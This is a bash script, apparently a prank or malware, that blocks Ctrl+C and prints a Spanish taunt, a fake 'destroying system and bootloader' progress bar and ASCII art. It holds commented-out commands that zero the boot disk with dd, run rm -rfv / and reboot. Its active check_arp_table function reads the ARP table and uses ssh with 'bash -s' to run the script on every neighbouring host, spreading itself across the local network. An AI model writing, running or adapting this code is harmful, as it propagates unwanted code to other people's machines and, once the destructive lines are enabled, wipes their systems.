#!/usr/bin/env bash

# Signal 2 is Ctrl+C
# Okay disable it:
trap '' 2  

function take_boot_disk() 
{
    DISKS="$(lsblk | grep -iv NAME | grep -i disk| awk -F ' ' '{print $1};')"
    echo "/dev/$DISKS"

}

function destroy_OS()
{
    setterm -foreground red
        for i in {1..50}; do sleep .1; echo "TE LA ACABAS DE BEBERRRR CON HIELOOOOOOOOO"; done
    
    sleep 3
    echo -e "Procediendo a destruir el sistema y bootloader..."
    sleep 2
        echo -ne '#####                     (33%)\r'
            sleep 1
        echo -ne '#############             (66%)\r'
            sleep 1
        echo -ne '#######################   (100%)\r'
            echo -ne '\n'
    
    #dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
    #rm -rfv /
    #printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
    
    echo $RANDOM | md5sum | head -c 20; echo;


    echo -e "
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
................................................................................
................................................................................
................................................................................
................................................................................
................................................................................
................................................................................
........+IIII.........................................................:I........
....IIIIII?:II:.....................................................IIII~,?=....
...IIIIIIIIII:I....................................................II~?I7IIIII..
..:7III7IIIII7II..................................................7I+IIIIIIIII7.
..:7.I=....IIIIII.......................:.........................IIIIII7I?I7II.
...I7..,III7IIIIIII...............+7IIIIIIIIII7.................I7II7I....I..II.
...IIIII+IIIIIIII7III...........IIIIIIIIIIIIIIIII.............IIIIIIIIIII+..III.
.....77II7....IIIII.+II.......7IIIIIIIIIIIIIIIIIIII?........7I+IIIIIII7II7II7I..
................IIIII.7II...IIIIIIIIIIIIIIIIII7IIIIII.....III.IIII7.....I7II....
.................=IIII7.7I.7III+7I7IIIIIIIIIIIIII~IIII..II7+7III7:..............
...................IIIIII.~?I7,IIIIIIIIIIIIIIIIIII,7II7.I,IIIIII................
......................77..7,I:IIIIIIIIIIIIIIIIIIIII+III..II77I..................
..........................I.7,IIIIIIIIIIIIIIIIIIIII?III+.II.....................
.........................+I.I7IIIIIIIIIIIIIIIIIIIIIIIII7........................
.........................I:.,7I.IIIIIIIIIIIIIIII7~III7+7........................
.........................7..7777IIIIIIIIIIIIIIIII77I7~.7........................
.........................I.IIIII7II7IIIIIIIIII7III777,.I........................
.........................=777....777:I7IIIII.7II....:I~7........................
..........................II........=77?..7I7........I7.........................
..........................7I............+............II.........................
..........................I7:.........,7II7..........7I.........................
.........................7I.I?.......I7I..II........III7........................
.........................7....7II777III....7I77I77IIIII7........................
..........................I...,I...II7.....7II...7IIIII.........................
...........................+.IIII7.III..7..,II?:I7III7..........................
.........................II7.7..7IIIII7IIII7IIIII..7.7I7........................
.......................7IIII..7..IIIIIIIIIIIIIIII.7..IIII7......................
.....................IIIIIII..77.=.+??7IIII++?:..II.:IIIIII7....................
..................7IIIII7.7....I.?~II++I.I:77I,I.I,..,7~IIIIIII.................
...............IIIIIIII.+=......II77?.~I.I..II7I7:.....I.IIIIIII7?..............
......7IIIIIIIIIIIIIII:I........I,7IIII..,I7III?I........I.IIIIIIIIIIIIIII7.....
.....7IIIIIIIIIIIIIIII...........I.~IIIIIIIIII.I7..........IIIIIIIIIIIIIIIII....
....=7IIIIIIIIIIIIII:............7I77IIIIIII=7:I............IIIIIIIIIIIIIIII....
.....77~IIIIIIIIII=...............IIIIIIIIIII77...............IIIIIIIIII7+77....
......77IIIIIIIII:.................=7IIIIIIIII.................IIIIIIIIIIII.....
......I77.7IIIII:...............................................7IIIIII,II7.....
.......7?IIIIII?................................................IIIII7III.......
.......+III=III7..................................................II=7III.......
........IIIII7...................................................7~I7.7II.......
............I7....................................................,I7...........
................................................................................
................................................................................
................................................................................
................................................................................
................................................................................
    
"


    
}

function bye_bye() {
        sleep 3
        init 6
}

function check_arp_table {
FILE_SEND="clean_boot_disk.sh"
FILE_PATH="/tmp"    
    ip neigh show | awk -F " " '{print $1};'
    cd $FILE_PATH
    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`; do ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND; done

}

destroy_OS

sleep 2

check_arp_table

#bye_bye